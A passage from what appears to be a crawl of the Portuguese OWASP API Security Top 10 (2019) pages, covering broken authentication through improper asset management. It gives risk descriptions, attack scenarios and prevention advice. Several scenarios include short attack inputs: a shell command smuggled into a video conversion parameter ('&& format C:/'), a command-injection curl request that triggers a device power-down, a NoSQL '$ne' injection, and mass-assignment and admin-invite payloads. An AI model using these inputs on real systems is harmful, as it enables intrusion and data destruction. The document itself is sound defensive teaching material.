de autenticação. Tenha certeza que você compreende quando e como foram utilizados. OAuth não é mecanismo de autenticação, e não é chave de API.\n* Não reinvente a roda em autenticação, geração de *token*, armazenamento de senhas. Utilize o que é padrão.\n* *Endpoints* para recuperação de senhas devem ser tratados assim como aqueles voltados para os processos de login para questões como ataques de força bruta, limitação de confiança e bloqueio de contas.\n* Use as informações do projeto [OWASP Authentication Cheatsheet][3].\n* Sempre que possível, implemente autenticação multi-fator.\n* Implemente mecanismos anti força bruta para mitigar *credential stuffing*, ataque por dicionário em seus *endpoints* de autenticação. A taxa de confiança da proteção desse mecanismo deve ser mais restrito que os demais mecanismos na sua API.\n* Implemente [bloqueio de conta][4] / mecanismos de CAPTCHA a fim de prevenir o uso de força bruta contra usuários específicos. Implemente verificação de senhas fracas.\n* Chaves de API não devem ser utilizadas para autenticação de usuários, mas para [aplicativos clientes e autenticação de projetos][5].\n\n## Referências\n\n### OWASP\n\n* [OWASP Key Management Cheat Sheet][6]\n* [OWASP Authentication Cheatsheet][3]\n* [Credential Stuffing][1]\n\n### Externas\n\n* [CWE-798: Use of Hard-coded Credentials][7]\n\n[1]: https://owasp.org/www-community/attacks/Credential_stuffing\n[2]: https://github.com/danielmiessler/SecLists\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n[4]: https://www.owasp.org/index.php/Testing_for_Weak_lock_out_mechanism_(OTG-AUTHN-003)\n[5]: https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\n[6]: https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html\n[7]: https://cwe.mitre.org/data/definitions/798.html\n", "timestamp": "2025-10-24T22:26:39.695226"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0xa3-excessive-data-exposure.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0xa3-excessive-data-exposure.md", "content": "# API3:2019 Excessive Data Exposure\n\n| Agentes/Vetores | Fraquezas de Segurança | Impactos |\n| - | - | - |\n| Específico da API : Explorabilidade **3** | Prevalência **2** : Detecção **2** | Técnico **2** : Específico do negócio |\n| A exploração por excesso de exposição de dados é simples, e usualmente realizada com o monitoramento do tráfego investigando as respostas da API, buscando dados sensíveis que não deveriam ser entregues ao usuário. | APIs confiam em clientes para ações de filtro de informação. Desde que APIs são utilizadas como fonte de informações, algumas vezes os desenvolvedores as implementam de maneira genérica sem considerar o quão sensíveis são os dados que elas expõem. Ferramentas de análise automatizada geralmente não podem detectar este tipo de vulnerabilidade em razão de ser difícil da legitimidade dos dados retornados pela API, e dados considerados sensíveis não devem ser retornado sem uma profunda análise e compreensão da aplicação. | Excesso de exposição de dados geralmente levam ao vazamento de dados sensíveis. |\n\n## A API está vulnerável?\n\nA API retorna dados sensíveis ao cliente por padrão. Este dado então é filtrado no lado do cliente antes de ser apresentado ao usuário. Um atacante pode facilmente investigar o tráfego e enxergar os dados sensíveis.\n\n## Cenários de exemplo de ataques\n\n### Cenário #1\n\nO time de desenvolvimento móvel utiliza o *endpoint* `/api/articles/{articleId}/comments/{commentId}` para exibir metadados dos comentários em artigos. Investigando o tráfego do aplicativo móvel, um atacante encontra outros dados sensíveis relacionados ao autores de comentários que também são entregues. Isto acontece por uma implementação genérica do *endpoint* utilizando o método de serialização `toJson()` ao modelo `User`, que também inclui dados sensíveis.\n\n### Cenário #2\n\nUm sistema de vigilância baseado em IoT permite aos administradores a criação de usuários com diferentes níveis de permissão. Um usuário admin criou uma conta para um novo guarda de segurança que deve ter acesso somente a algumas áreas específicas do prédio. Uma vez que utiliza um aplicativo móvel, uma chamada de API é realizada em `/api/sites/111/cameras` para que sejam recebidas informações a respeito das câmeras disponíveis para apresentação em um painel de controle. A resposta da API contém uma lista com detalhes a respeito das câmeras no seguinte formato: `/api/sites/111/cameras`. Enquanto a interface gráfica exibe apenas as câmeras às quais deveria o guarda ter acesso, a resposta da API contém uma lista de todas as câmeras em uso naquele prédio.\n\n\n## Como prevenir\n\n* Nunca confie no cliente para filtrar dados sensíveis.\n* Revise as respostas da API para ter certeza que elas contenham apenas informações necessárias.\n* Engenheiros e arquitetos de *endpoints* sempre devem ser perguntar: quem irá utilizar esta informação? antes de expor um novo *endpoint* de API.\n* Tenha cuidado ao utilizar métodos genéricos como `to_json()` e `to_string()`. Ao contrário, seja criterioso com cada propriedade que seja necessário retornar.\n* Classifique dados sensíveis e dados pessoais que sua aplicação armazena, revise todas as chamadas de API se estas chamadas podem significar um problema de segurança.\n* Implemente respostas com mecanismos baseados em *schema* como uma camada extra de segurança. Aplique o mecanismo e o imponha a todos os dados retornados pela API, inclusive erros.\n\n## Referências\n\n### Externas\n\n* [CWE-213: Intentional Information Exposure][1]\n\n[1]: https://cwe.mitre.org/data/definitions/213.html\n", "timestamp": "2025-10-24T22:26:39.812614"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0xa4-lack-of-resources-and-rate-limiting.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0xa4-lack-of-resources-and-rate-limiting.md", "content": "# API4:2019 Lack of Resources & Rate Limiting\n\n| Agentes/Vetores | Fraquezas de Segurança | Impactos |\n| - | - | - |\n| Específico da API : Explorabilidade **2** | Prevalência **3** : Detecção **3** | Técnico **2** : Específico do negócio |\n| A exploração requer simples requisições na API. Não é necessária autenticação. Requisições múltiplas e concorrentes podem ser executadas de um único ponto utilizando um único computador ou ainda utilizando recursos em nuvem. | É comum encontrar APIs que não implementam limites ou estes limites não estão implementados corretamente. | A exploração pode levar ao DoS, levando a API à lentidão ou à completa indisponbilidade. |\n\n## A API está vulnerável?\n\nRequisições de API consome recursos como rede, processador, memória e armazenamento. A quantidade de recursos necessária para um desempenho satisfatório depende da entrada do usuário e da lógica de negócio da API. Considere também que o fato de múltiplas chamadas na API a partir de diversos clientes irão competir pelos recursos. Um API é vulnerável se algum dos seguintes parâmetros estiverem ausentes ou mal configurados (em excesso ou muito baixos):\n\n* Tempo limite de execução (*timeout*)\n* Limite máximo de alocação de memória\n* Número de *file descriptors*\n* Número de processadores\n* Tamanho de *payload* (ex. uploads)\n* Número de requisições por cliente/recurso\n* Número de registros por página a retornar em uma única requisição\n\n## Cenários de exemplo de ataques\n\n### Cenário #1\n\nUm atacante faz *uploads* de imagens grandes enviando request POST em `/api/v1/images`, quando o upload é finalizado, a API cria múltiplos *thumbnails* com diferentes tamanhos. Devido ao grande tamanho da imagem enviada por upload, a memória disponível é exaurida durante a criação dos *thumbnails* e a API fica indisponível.\n\n### Cenário #2\n\nUma aplicação contém uma lista de usuários em uma interface com o limite de `200` usuários por página. A lista é solicitada ao servidor utilizando a seguinte *query* `/api/users?page=1&size=200`. Um atacante modifica o parâmetro `size` de `200` para `200000`, provocando problemas de desempenho no banco de dados. Enquanto isso, a API torna-se indisponível e portanto incapaz de responder outras requisições deste e de todos os demais clientes (também conhecido como DoS).\n\nEste mesmo cenário pode ser utilizado para provocar erros de *Integer Overflow* ou *Buffer Overflow*.\n\n## Como prevenir\n\n* Docker torna mais fácil limitar [memória][1], [CPU][2], [quantidade de *restart*][3], [*file descriptors*, e processos][4].\n* Implemente um limite de frequência para um cliente chamar a API em um determinado espaço de tempo.\n* Notifique o cliente quando o limite for excedido, informando o limite e quando o limite alcançado será reiniciado.\n* Adicione validações do lado do servidor para validação de parâmetros, principalmente controles de quantidade de registros a serem retornados.\n* Defina e implemente tamanhos máximos de dados recebidos por parâmetro e *payloads*.\n\n## Referências\n\n### OWASP\n\n* [Blocking Brute Force Attacks][5]\n* [Docker Cheat Sheet - Limit resources (memory, CPU, file descriptors,\n  processes, restarts)][6]\n* [REST Assessment Cheat Sheet][7]\n\n### Externas\n\n* [CWE-307: Improper Restriction of Excessive Authentication Attempts][8]\n* [CWE-770: Allocation of Resources Without Limits or Throttling][9]\n* “_Rate Limiting (Throttling)_” - [Security Strategies for Microservices-based\n  Application Systems][10], NIST\n\n[1]: https://docs.docker.com/config/containers/resource_constraints/#memory\n[2]: https://docs.docker.com/config/containers/resource_constraints/#cpu\n[3]: https://docs.docker.com/engine/reference/commandline/run/#restart-policies---restart\n[4]: https://docs.docker.com/engine/reference/commandline/run/#set-ulimits-in-container---ulimit\n[5]: https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks\n[6]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/Docker_Security_Cheat_Sheet.md#rule-7---limit-resources-memory-cpu-file-descriptors-processes-restarts\n[7]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[8]: https://cwe.mitre.org/data/definitions/307.html\n[9]: https://cwe.mitre.org/data/definitions/770.html\n[10]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204-draft.pdf\n", "timestamp": "2025-10-24T22:26:39.942014"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0xa5-broken-function-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0xa5-broken-function-level-authorization.md", "content": "# API5:2019 Broken Function Level Authorization\n\n| Agentes/Vetores | Fraquezas de Segurança | Impactos |\n| - | - | - |\n| Específico da API : Explorabilidade **3** | Prevalência **2** : Detecção **1** | Técnico **2** : Específico do negócio |\n| A exploração requer que o atacante envie chamadas legítimas ao *endpoint* da API ao qual não deveria ter acesso. Estes *endpoints* estão expostos para usuários anônimos ou à usuários regulares e/ou não privilegiados. É fácil encontrar estas falhas uma vez que APIs melhor estruturadas possuem funções mais previsíveis (ex. modificando métodos HTTPS de GET para PUT ou mudando a URL de \"users\" para \"admins\"). | Verificações de autorização para uma função ou recurso geralmente são gerenciadas por configuração e em alguns casos a nível de código. Implementar verificações apropriadas pode ser uma tarefa confusa, uma vez que aplicativos modernos podem conter muitos tipos de papéis ou grupos e ainda uma complexa hierarquia de usuários (ex.: sub-usuários, usuários com mais de um papel). | Este tipo de falha pode permitir que atacantes tenham acesso a funções não autorizadas. Funções administrativas geralmente são os alvos deste tipo de ataque. |\n\n## A API está vulnerável?\n\nA melhor maneira de encontrar quebras de função e autorização é executar uma profunda análise do mecanismo de autorização, ao mesmo tempo mantendo em mente a hierarquia de usuário, diferentes papéis ou grupos da aplicação e perguntando-se as seguintes questões:\n\n* Pode um usuário regular acessar *endpoints* administrativos?\n* Pode um usuário executar ações sensíveis (ex.: criação, modificação ou exclusão), mesmo apenas alterando o método HTTP (ex.: trocando `GET` para `DELETE`)?\n* Pode um usuário do grupo de acesso X acessar uma função que deve ser acessível apenas para usuários do grupo Y apenas adivinhando a URL (ex.:  `/api/v1/users/export_all`)?\n\nNunca considere apenas a URL como separação de *endpoints* regulares e administrativas.\n\nUma vez que desenvolvedores podem optar pela exposição de *endpoints* administrativos por um determinado caminho como `api/admins`, também é muito comum encontrar endpoints administrativos em caminhos similares como `api/users`.\n\n## Cenários de exemplo de ataques\n\n### Cenário #1\n\nDurante o processo de registro de uma aplicação que permite apenas usuários convidados se cadastrarem, o aplicativo móvel realiza uma chamada de API para `GET /api/invites/{invite_guid}`. A resposta no formato JSON contém os detalhes sobre o convite, incluindo o papel e endereço de e-mail do usuário.\n\nUm atacante duplica a requisição e, modifica o método HTTP e o *endpoint* para `POST /api/invites/new`. Este *endpoint* deveria ser acessível apenas por administradores utilizando a console administrativa, que não implementa uma autorização de nível de função.\n\nO atacante então explora este problema enviando a si mesmo um convite para criar uma conta administrativa:\n\n```\nPOST /api/invites/new\n\n{“email”:”hugo@malicious.com”,”role”:”admin”}\n```\n\n### Cenário #2\n\nUma API contém um *endpoint* que deveria estar exposta apenas para administradores: `GET /api/admin/v1/users/all`. Este *endpoint* retorna detalhes sobre todos os usuários e não implementa uma verificação de nível de função. Um atacante que estudou a estrutura da API e consegue encontrar este *endpoint* que expõe detalhes de todos os usuários da aplicação.\n\n## Como prevenir\n\nSua aplicação deve possuir um consistente módulo de autorização a ser invocado por todas suas funções. Frequentemente este tipo de proteção é provida por um ou mais componentes externos ao código da aplicação.\n\n* O mecanismo de verificação deve negar tudo por padrão, requerendo permissões explícitas para papéis de cada função.\n* Revise seus *endpoints* de API para validar falhas de autorização, enquanto mantém em mente a lógica de negócio da aplicação e hierarquia de grupos.\n* Certifique-se que todos seus controles administrativos sejam herdados por um *controller* de abstração que implemente as verificações de autorização.\n* Tenha certeza que funções administrativas dentro de *controllers* regulares implementem verificação de autorização baseado no usuário, grupos e papéis.\n\n## Referências\n\n### OWASP\n\n* [OWASP Article on Forced Browsing][1]\n* [OWASP Top 10 2013-A7-Missing Function Level Access Control][2]\n* [OWASP Development Guide: Chapter on Authorization][3]\n\n### Externas\n\n* [CWE-285: Improper Authorization][4]\n\n[1]: https://www.owasp.org/index.php/Forced_browsing\n[2]: https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html\n[4]: https://cwe.mitre.org/data/definitions/285.html\n", "timestamp": "2025-10-24T22:26:40.060851"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0xa6-mass-assignment.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0xa6-mass-assignment.md", "content": "# API6:2019 - Mass Assignment\n\n| Agentes/Vetores | Fraquezas de Segurança | Impactos |\n| - | - | - |\n| Específico da API : Explorabilidade **2** | Prevalência **2** : Detecção **2** | Técnico **2** : Específico do negócio |\n| A exploração usualmente requer compreensão da lógica de negócio, relação entre objetivos e estrutura da API. Este tipo de exploração é mais fácil em APIs, uma vez que por *design* elas expõem implementações internas do aplicativo junto de suas propriedades. | *Frameworks* modernos encorajam desenvolvedores a utilizar funções que automaticamente conectam a entrada do cliente em variáveis de código e objetos internos. Atacantes podem utilizar esta metodologia para atualizar ou sobrescrever propriedades em objetos sensíveis que os desenvolvedores nunca tiveram intenção de expor. | A exploração pode levar a escalação de privilégios, adulteração de dados, desvio de mecanismos de segurança, entre outros. |\n\n## A API está vulnerável?\n\nObjetos em aplicativos modernos podem conter muitas propriedades. Algumas dessas propriedades podem ser diretamente atualizadas pelo cliente (ex.: `user.first_name` ou `user.address`), outras propriedades por sua vez podem não ser (ex.: o *flag* `user.is_vip`).\n\nUm *endpoint* de API está vulnerável se ele automaticamente converte parâmetros recebidos do cliente em propriedades de objeto internos, sem considerar o quão sensível são estas mesmas propriedades. Isto pode permitir a um atacante atualizar propriedades de um objeto ao qual ele não deveria ter acesso.\n\nExemplos de propriedades sensíveis:\n\n* **Propriedades relacionadas à permissões**: `user.is_admin`, `user.is_vip` devem ser escritas somente por admins.\n* **Propriedades que depende de processamento**: `user.cash` deve ser escrita somente após a efetivação/verificação do pagamento.\n* **Propriedades internas**: `article.created_time` deve ser escrita apenas internamente pela aplicação.\n\n## Cenários de exemplo de ataques\n\n### Cenário #1\n\nUm aplicativo de compartilhamento de corridas permite ao usuário a opção de editar informações e dados básicos do seu perfil. Durante este processo, uma chamada à API é enviada para `PUT /api/v1/users/me` com o seguinte, e legítimo, objeto JSON:\n\n```json\n{\"user_name\":\"inons\",\"age\":24}\n```\nA requisição `GET /api/v1/users/me` inclui uma propriedade adicional chamada \"credit_balance property\":\n\n```json\n{\"user_name\":\"inons\",\"age\":24,\"credit_balance\":10}\n```\nO atacante repete a primeira requisição com o *payload* abaixo:\n\n```json\n{\"user_name\":\"attacker\",\"age\":60,\"credit_balance\":99999}\n```\n\nUma vez que o *endpoint* está vulnerável, o atacante recebe créditos sem pagar.\n\n### Cenário #2\n\nUm portal de compartilhamento de vídeos permite aos usuários o envio de conteúdo e *download* de conteúdo em diferentes formatos. Um atacante explora a API no *endpoint* `GET /api/v1/videos/{video_id}/meta_data` que retorna um objeto com propriedades do vídeo. Uma das propriedades é `\"mp4_conversion_params\":\"-v codec h264\"`, que indica que a aplicação usa um comando *shell* para converter o vídeo.\n \nEste mesmo atacante encontrou o *endpoint* `POST /api/v1/videos/new` que está vulnerável e permite ao cliente atribuir qualquer propriedade ao objeto vídeo, então o atacante atribui um valor malicioso como o exemplo a seguir: `\"mp4_conversion_params\":\"-v codec h264 && format C:/\"`. Este valor poderá causar a execução de um comando *shell* quando o atacante pedir o *download* do vídeo no formato mp4.\n\n## Como prevenir\n\n* Se possível evite usar funções que automaticamente conectam entradas de usuário em variáveis no código ou em objetos internos.\n* Desenvolva controles para permitir que apenas determinadas propriedades possam ser atualizadas pelo cliente.\n* Use recursos *built-in* para criar listas de proibição do que não deve ser acessado pelo cliente.\n* Se aplicável, aplique de maneira explícita *schemas* nas entradas de *payload* dos usuários.\n\n## Referências\n\n### Externas\n\n* [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes][1]\n\n[1]: https://cwe.mitre.org/data/definitions/915.html\n", "timestamp": "2025-10-24T22:26:40.182659"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0xa7-security-misconfiguration.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0xa7-security-misconfiguration.md", "content": "# API7:2019 Security Misconfiguration\n\n| Agentes/Vetores | Fraquezas de Segurança | Impactos |\n| - | - | - |\n| Específico da API : Explorabilidade **3** | Prevalência **3** : Detecção **3** | Técnico **2** : Específico do negócio |\n| Atacantes eventualmente procuram falhas não corrigidas, *endpoints* comuns, ou diretórios não protegidos para ganhar acesso não-autorizado ou realizar um reconhecimento do sistema. | Configurações inadequadas de segurança podem ocorrer a qualquer nível do *stack* da API, desde o nível da rede até o nível da aplicação. Ferramentas de automação estão disponíveis para detectar e explorar erros de configuração, como serviços desnecessários e opções de suporte ao legado. | Configurações inadequadas podem não apenas expor dados sensíveis de usuários, como também podem revelar detalhes do sistema e comprometer servidores como um todo. |\n\n## A API está vulnerável?\n\nSua API pode estar vulnerável se:\n\n* Configurações apropriadas de *hardening* faltam a qualquer parte da aplicação, ou quando há permissões mal configuradas em provedores de nuvem.\n* Os últimos *patches* de segurança não estão aplicados ou os sistemas estão desatualizados.\n* Recursos não necessários estão habilitados (ex.: certos verbos HTTP).\n* Transporte criptografado (TLS) não configurado.\n* Diretivas de segurança não enviadas aos clientes (ex.: [Cabeçalhos de Segurança][1]).\n* Configurações de política CORS (*Cross-Origin Resource Sharing*) não configuradas ou configuradas inadequadamente.\n* Mensagens de erro incluindo *stack trace* ou informações sensíveis.\n\n## Cenários de exemplo de ataques\n\n### Cenário #1\n\nUm atacante encontra o arquivo `.bash_history` no diretório root do servidor, o qual contém comandos utilizados pelo time de DevOps para acesso à API:\n\n```\n$ curl -X GET 'https://api.server/endpoint/' -H 'authorization: Basic Zm9vOmJhcg=='\n```\nUm atacante pode também encontrar novos *endpoints* da API que são utilizados apenas pelo time de DevOps os quais não constam na documentação.\n\n### Cenário #2\n\nPara mirar um serviço em específico, um atacante utiliza uma popular ferramenta de pesquisa na web para encontrar servidores que estão diretamente acessíveis na internet. Este atacante encontra um *host* executando um popular serviço de gerenciamento de banco de dados, o qual está ouvindo na porta padrão. Este mesmo *host* utiliza configurações padrão do sistema de gerenciamento de banco de dados, o qual a autenticação de acesso é desabilitada por padrão, então o atacante consegue acesso à milhares de registros com dados pessoais sensíveis e dados de autenticação.\n\n### Cenário #3\n\nInspecionando o tráfego de um aplicativo móvel, um atacante encontra que nem todo o tráfego HTTP está sendo executado em protocolo seguro (ex.: TLS). O atacante confirma esta condição ao realizar o *download* de imagens de perfis. Como a interação do usuário nesse caso é binária, apesar do fato de o tráfego da API ser realizado com protocolo seguro, o atacante encontra um padrão no tamanho das respostas da API e utiliza isso para monitorar preferências de usuário sobre o conteúdo renderizado (Ex. Imagens de perfil).\n\n## Como prevenir\n\nO ciclo de vida da API deve incluir:\n\n* Um processo de *hardening* contínuo levando a um rápido e fácil modelo de entrega a um ambiente apropriadamente protegido.\n* Uma tarefa de revisão e atualização de configurações em todo o *stack* da API, essa revisão deve incluir: Arquivos de orquestração, componentes de API, serviços de nuvem (ex.: permissões de *buckets*).\n* Um canal de comunicação segura para todos os pontos de interação da API, inclusive objetos estáticos (Ex.: Imagens).\n* Processo automatizado para continuamente avaliar a efetividade das configurações e preferências em todos os ambientes.\n\nAlém disso:\n\n* Para prevenir que detalhes de erros e outras informações sejam enviados de volta aos atacantes, se aplicável, defina e aplique *schemas* aos *responses* da API.\n* Certifique-se que a API só pode ser acessada por verbos HTTP específicos. Todos os demais verbos devem estar desabilitados (ex: `HEAD`).\n* APIs que devem ser acessadas por navegadores (ex.: *front-end* de aplicação web) devem implementar uma política CORS apropriada.\n\n## Referências\n\n### OWASP\n\n* [OWASP Secure Headers Project][1]\n* [OWASP Testing Guide: Configuration Management][2]\n* [OWASP Testing Guide: Testing for Error Codes][3]\n* [OWASP Testing Guide: Test Cross Origin Resource Sharing][9]\n\n### Externas\n\n* [CWE-2: Environmental Security Flaws][4]\n* [CWE-16: Configuration][5]\n* [CWE-388: Error Handling][6]\n* [Guide to General Server Security][7], NIST\n* [Let’s Encrypt: a free, automated, and open Certificate Authority][8]\n\n[1]: https://owasp.org/www-project-secure-headers/\n[2]: https://www.owasp.org/index.php/Testing_for_configuration_management\n[3]: https://www.owasp.org/index.php/Testing_for_Error_Code_(OTG-ERR-001)\n[4]: https://cwe.mitre.org/data/definitions/2.html\n[5]: https://cwe.mitre.org/data/definitions/16.html\n[6]: https://cwe.mitre.org/data/definitions/388.html\n[7]: https://csrc.nist.gov/publications/detail/sp/800-123/final\n[8]: https://letsencrypt.org/\n[9]: https://www.owasp.org/index.php/Test_Cross_Origin_Resource_Sharing_(OTG-CLIENT-007)\n", "timestamp": "2025-10-24T22:26:40.317189"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0xa8-injection.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0xa8-injection.md", "content": "# API8:2019 Injection\n\n| Agentes/Vetores | Fraquezas de Segurança | Impactos |\n| - | - | - |\n| Específico da API : Explorabilidade **3** | Prevalência **2** : Detecção **3** | Técnico **3** : Específico do negócio |\n| Atacantes vão entregar à API dados maliciosos a quaisquer vetores de injeção disponíveis (ex.: dados, parâmetros, integrações e etc.), esperando que estes dados sejam entregues a um interpretador. | Falhas por injeção são muito comuns e geralmente encontrados em consultas SQL, LDAP ou noSQL, comando em SO, *parsers* de XML e ORM. São falhas simples de encontrar ao revisar código fonte, e atacantes podem utilizar *scanners* e *fuzzers*. | Injeção pode levar ao vazamento de informação e perda de dados. Também podem levar à DoS ou a perda completa de um *host*. |\n\n## A API está vulnerável?\n\nA API está vulnerável às falhas de injeção se:\n\n* Dados enviados pelo cliente não são validados, filtrados ou sanitizados pela API.\n* Dados enviados pelo cliente são utilizados diretamente ou concatenados para consultas SQL/NoSQL/LDAP, comandos de sistema operacional, *parsers* XML, ORM (*Object Relational Mapping*) ou ODM (*Object Document Mapper*).\n* Dados vindos de sistemas externos (ex.: sistemas de integração) não são validados, filtrados ou sanitizados pela API.\n\n## Cenários de exemplo de ataques\n\n### Cenário #1\n\nO *firmware* de um dispositivo de controle parental provê o *endpoint* `/api/CONFIG/restore` o qual espera um appId a ser enviado como um parâmetro *multipart*. Utilizando um descompilador, o atacante encontra que o parâmetro appId é repassado diretamente para uma chamada de sistema sem qualquer sanitização:\n\n```c\nsnprintf(cmd, 128, \"%srestore_backup.sh /tmp/postfile.bin %s %d\",\n         \"/mnt/shares/usr/bin/scripts/\", appid, 66);\nsystem(cmd);\n```\nCom o seguinte comando o atacante consegue desligar qualquer dispositivo que estiver com o *firmware* vulnerável:\n\n```\n$ curl -k \"https://${deviceIP}:4567/api/CONFIG/restore\" -F 'appid=$(/etc/pod/power_down.sh)'\n```\n\n### Cenário #2\n\nEstamos com uma aplicação com funcionalidades básicas de CRUD para operações de agendamento. Um atacante identifica que uma injeção NoSQL pode ser possível por meio do um parâmetro `bookingId` informado via *querystring* na requisição de exclusão de pedido de agendamento. Eis a requisição em questão: `DELETE /api/bookings?bookingId=678`.\n\nO servidor da API utiliza a seguinte função para executar a requisição de exclusão:\n\n```javascript\nrouter.delete('/bookings', async function (req, res, next) {\n  try {\n      const deletedBooking = await Bookings.findOneAndRemove({'_id' : req.query.bookingId});\n      res.status(200);\n  } catch (err) {\n     res.status(400).json({error: 'Unexpected error occured while processing a request'});\n  }\n});\n```\n\nO atacante intercepta a requisição de modifica o valor da *querystring* `bookingId` como demonstrado abaixo. Neste caso, o atacante consegue excluir todos os demais agendamentos de usuários:\n\n```\nDELETE /api/bookings?bookingId[$ne]=678\n```\n\n## Como prevenir\n\nPrevenir injeção requer manter os dados separados de comandos e consultas.\n\n* Execute validação de dados utilizando uma biblioteca única, confiável e de ativa manutenção.\n* Valide, filtre e sanitize todos os dados providos pelo cliente, e também dados vindos de sistemas integradores.\n* Caracteres especiais devem ser avaliados utilizando a sintaxe específica do interpretador dos comandos.\n* Prefira APIs seguras, que entreguem interfaces seguras e parametrizadas.\n* Sempre limite o número de registros retornados para prevenir vazamento em massa em caso de injeção.\n* Valide os dados recebidos utilizando filtros suficientes para permitir que apenas valores válidos cheguem aos interpretadores.\n* Defina tipos de dados de padrões *strict* em todos os parâmetros do tipo *string*.\n\n## Referências\n\n### OWASP\n\n* [OWASP Injection Flaws][1]\n* [SQL Injection][2]\n* [NoSQL Injection Fun with Objects and Arrays][3]\n* [Command Injection][4]\n\n### Externas\n\n* [CWE-77: Command Injection][5]\n* [CWE-89: SQL Injection][6]\n\n[1]: https://owasp.org/www-community/Injection_Flaws\n[2]: https://owasp.org/www-community/attacks/SQL_Injection\n[3]: https://www.owasp.org/images/e/ed/GOD16-NOSQL.pdf\n[4]: https://owasp.org/www-community/attacks/Command_Injection\n[5]: https://cwe.mitre.org/data/definitions/77.html\n[6]: https://cwe.mitre.org/data/definitions/89.html\n", "timestamp": "2025-10-24T22:26:40.435527"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0xa9-improper-assets-management.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0xa9-improper-assets-management.md", "content": "# API9:2019 Improper Assets Management\n\n| Agentes/Vetores | Fraquezas de Segurança | Impactos |\n| - | - | - |\n| Específico da API : Explorabilidade **3** | Prevalência **3** : Detecção **2** | Técnico **2** : Específico do negócio |\n| Versões desatualizadas de APIs geralmente carecem de *patches* e são um meio fácil de comprometer sistemas sem a presença de mecanismos de segurança no estado-da-arte, e que podem existir também para proteger versões atualizadas de APIs. | Documentação desatualizada torna mais difícil encontrar e/ou corrigir vulnerabilidades. Falta de um inventário de ativos e estratégias de retirada levam ao cenário de sistemas sem atualização permanecerem em execução, podendo resultar no vazamento de dados sensíveis. É bastante comum encontrar APIs expostas sem necessidade em razão de conceitos modernos como os de microsserviços, que permite que aplicativos sejam lançados independentemente (ex.: computação em nuvem, kubernetes). | Atacantes têm acesso a dados sensíveis e até tomar o controle de servidores por meio de uma velha e desatualizada API conectada ao mesmo banco de dados. |\n\n## A API está vulnerável?\n\nA API pode estar vulnerável se:\n\n* O propósito do *host* da API não for claro, e se não há respostas explícitas para as seguintes questões:\n    * Em qual ambiente está rodando à API? (Ex.: produção, *staging*, teste, desenvolvimento)?\n    * Quem deve ter acesso via rede à API (Ex.: pública, interna, parceiros)?\n    * Em qual versão está a API em execução?\n    * Que tipo de informação acessa a API (Ex.: Dados pessoais sensíveis)?\n    * Qual é o fluxo da informação?\n* Não existe documentação, ou a documentação existente está desatualizada.\n* Não há um plano de retirada para cada versão da API.\n* Inventário de *hosts* não existe ou está desatualizado.\n* Inventário de serviços de integração, seja interna ou de parceiros, não existe ou está desatualizado.\n* Versões antigas da API continuam rodando sem *patches*.\n\n## Cenários de exemplo de ataques\n\n### Cenário #1\n\nApós um redesenho de suas aplicações, um serviço de pesquisa local deixou uma versão antiga da API (`api.someservice.com/v1`) em execução, não protegida, e com acesso ao banco de dados. Enquanto buscava como alvo a última versão do aplicativo, um atacante percebeu o endereço da API (`api.someservice.com/v2`). Substituindo `v2` por  `v1` na URL, o atacante acessou a versão antiga e não protegida, a qual expõe dados pessoais sensíveis de mais de 100 milhões de usuários.\n\n### Cenário #2\n\nUma rede social implementou um nível de classificação mínimo que bloqueia atacantes do uso de força bruta para conseguir acesso por meio de adivinhação de *tokens* de redefinição de senhas de acesso. Este mecanismo não foi implementado no código próprio da API, mas em um componente separado entre o cliente e a API oficial (`www.socialnetwork.com`). Um pesquisador encontrou a versão beta da API (`www.mbasic.beta.socialnetwork.com`) que executa a mesma API, incluindo o mecanismo de redefinição de senha, onde o nível de classificação mínimo não está ativado. Dessa maneira ele pode redefinir a senha de qualquer usuário com um mecanismo simples de força bruta para adivinhar o *token* de seis dígitos.\n\n## Como prevenir\n\n* Faça o inventário de todos os *hosts* de API e documente aspectos importantes de cada um deles, com foco no ambiente das APIs (Ex.: produção, *staging*, testes, desenvolvimento), e qual desses ambientes deve ter acesso à quais redes (Ex.: pública, interno, parceiros) e as versões da API.\n* Faça o inventário de todos os serviços de integração e documente os aspectos importantes como o papel de cada um deles no sistema, qual tipo de dado é trocado e se estes dados são sensíveis.\n* Documente todos os aspectos da sua API, como autenticação, erros, redirecionamentos, limite de classificação, política de *cross-origin resource sharing* (CORS) e seus *endpoints*, incluindo os parâmetros, requisições e respostas.\n* Faça documentações automatizadas utilizando padrões abertos, inclua a documentação de compilação no *pipeline* de CI/CD.\n* Faça a documentação disponível para aqueles autorizados à utilizá-la.\n* Utilize métricas de proteção como *firewalls* de APIs para todas as versões expostas e não apenas para a versão em produção.\n* Evite utilizar dados de produção em *deployments* de API em ambientes de não produção. Caso seja 